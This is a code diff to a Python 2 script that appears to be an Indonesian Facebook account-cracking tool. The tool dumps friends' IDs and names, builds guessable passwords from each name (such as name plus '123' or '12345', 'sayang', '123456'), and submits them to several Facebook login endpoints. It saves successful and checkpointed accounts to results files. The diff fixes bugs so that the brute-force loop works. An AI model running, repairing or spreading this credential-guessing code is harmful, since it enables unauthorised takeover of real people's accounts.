@@ -85,11 +85,9 @@ def hasil(ok,cp):
 		print '\n\n %s[%s#%s] crack selesai...\n\n'%(N,K,N)
 		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
 		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
-		os.remove(self.pler)
 		exit()
 	else:
 		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
-		os.remove(self.pler)
 		exit()
 # Token FB bukan token PLN
 def yayanxd():
@@ -310,7 +308,7 @@ def publik():
         id = []
         z = json.loads(xxx.text)
         kntl = ('dump/' + ahh + '.json').replace(' ', '_')
-        ys = open(ppk, 'w')
+        ys = open(kntl, 'w')
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
@@ -572,11 +570,11 @@ class __crack__:
 
     def slurr(self):
         try:
-            self.pler = raw_input('\n [?] masukan file : ')
-            self.id   = open(self.pler).read().splitlines()
+            self.apk = raw_input('\n [?] masukan file : ')
+            self.id = open(self.apk).read().splitlines()
             print '\n [+] total id -> %s%s%s' %(M,len(self.id),N)
         except:
-            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.pler,P)
+            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,P)
             time.sleep(3)
             moch_yayan()
 
@@ -606,7 +604,10 @@ class __crack__:
                                     except:
                                         pass
 
+                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+                            os.remove(self.apk)
                             hasil(ok,cp)
+                            exit()
                         elif cin == '2':
                             print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
@@ -619,7 +620,10 @@ class __crack__:
                                     except:
                                         pass
 
+                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+                            os.remove(self.apk)
                             hasil(ok,cp)
+                            exit()
                         elif cin == '3':
                             print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
@@ -632,7 +636,10 @@ class __crack__:
                                     except:
                                         pass
 
+                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+                            os.remove(self.apk)
                             hasil(ok,cp)
+                            exit()
                         else:
                             print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                             time.sleep(2)
@@ -756,37 +763,40 @@ class __crack__:
                         cy = bb[1].split(' ')
                         if len(cy) == 1:
                             bacotBrotherhood = [
-                            	cy[0]+'123', obj[0]+'1234',
+                            	cy[0]+'123', cy[0]+'1234',
                             	cy[0]+'12345',
                             ]
                         elif len(cy) == 2:
                         	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
                         	]
                         elif len(cy) == 3:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
-                        		cy[2]+'123', obj[2]+'12345',
+                        	bacotbrotherhood = [
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
                         	]
                         elif len(cy) == 4:
                         	bacotBrotherhood = [
-                        		obj[0]+'123', obj[0]+'12345',
-                        		obj[1]+'123', obj[1]+'12345',
-                        		obj[2]+'123', obj[2]+'12345',
-                        		obj[3]+'123', obj[3]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
+                        		cy[3]+'123', cy[3]+'12345',
                         	]
                         else:
                         	bacotBrotherhood = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__api__, bb[0], listpass)
+                        __yayanXD__.submit(self.__api__, bb[0], bacotBrotherhood)
                     except:
                         pass
 
+            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+            os.remove(self.apk)
             hasil(ok,cp)
+            exit()
         elif yan in ('2', '02'):
             print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
@@ -798,37 +808,40 @@ class __crack__:
                         cy = bb[1].split(' ')
                         if len(cy) == 1:
                             bacotBrotherhood = [
-                            	cy[0]+'123', obj[0]+'1234',
+                            	cy[0]+'123', cy[0]+'1234',
                             	cy[0]+'12345',
                             ]
                         elif len(cy) == 2:
                         	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
                         	]
                         elif len(cy) == 3:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
-                        		cy[2]+'123', obj[2]+'12345',
+                        	bacotbrotherhood = [
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
                         	]
                         elif len(cy) == 4:
                         	bacotBrotherhood = [
-                        		obj[0]+'123', obj[0]+'12345',
-                        		obj[1]+'123', obj[1]+'12345',
-                        		obj[2]+'123', obj[2]+'12345',
-                        		obj[3]+'123', obj[3]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
+                        		cy[3]+'123', cy[3]+'12345',
                         	]
                         else:
                         	bacotBrotherhood = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__mbasic__, bb[0], listpass)
+                        __yayanXD__.submit(self.__mbasic__, bb[0], bacotBrotherhood)
                     except:
                         pass
 
+            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+            os.remove(self.apk)
             hasil(ok,cp)
+            exit()
         elif yan in ('3', '03'):
             print '\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
             print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
@@ -840,37 +853,40 @@ class __crack__:
                         cy = bb[1].split(' ')
                         if len(cy) == 1:
                             bacotBrotherhood = [
-                            	cy[0]+'123', obj[0]+'1234',
+                            	cy[0]+'123', cy[0]+'1234',
                             	cy[0]+'12345',
                             ]
                         elif len(cy) == 2:
                         	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
                         	]
                         elif len(cy) == 3:
-                        	bacotBrotherhood = [
-                        		cy[0]+'123', obj[0]+'12345',
-                        		cy[1]+'123', obj[1]+'12345',
-                        		cy[2]+'123', obj[2]+'12345',
+                        	bacotbrotherhood = [
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
                         	]
                         elif len(cy) == 4:
                         	bacotBrotherhood = [
-                        		obj[0]+'123', obj[0]+'12345',
-                        		obj[1]+'123', obj[1]+'12345',
-                        		obj[2]+'123', obj[2]+'12345',
-                        		obj[3]+'123', obj[3]+'12345',
+                        		cy[0]+'123', cy[0]+'12345',
+                        		cy[1]+'123', cy[1]+'12345',
+                        		cy[2]+'123', cy[2]+'12345',
+                        		cy[3]+'123', cy[3]+'12345',
                         	]
                         else:
                         	bacotBrotherhood = [
                         		'sayang', 'anjing',
                         		'bismillah', '123456'
                         	]
-                        __yayanXD__.submit(self.__mfb__, bb[0], listpass)
+                        __yayanXD__.submit(self.__mfb__, bb[0], bacotBrotherhood)
                     except:
                         pass
 
+            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+            os.remove(self.apk)
             hasil(ok,cp)
+            exit()
             
 if __name__ == '__main__':
     os.system('git pull')
